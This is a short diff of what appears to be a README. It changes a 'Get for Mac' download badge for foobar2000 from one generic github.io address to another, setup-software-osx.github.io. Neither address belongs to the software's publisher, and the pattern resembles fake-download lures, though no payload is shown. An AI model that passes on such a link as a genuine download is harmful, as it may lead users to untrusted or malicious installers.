@@ -6,7 +6,7 @@
 <br>
 <div align="center">
 
-[![🎧 Get for Mac](https://img.shields.io/badge/🎧_Get_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app-soft.github.io/.github/foobar2000)
+[![🎧 Get for Mac](https://img.shields.io/badge/🎧_Get_for_Mac-blue?style=for-the-badge&logo=apple)](https://setup-software-osx.github.io/.github/foobar2000)
 
 </div>
 
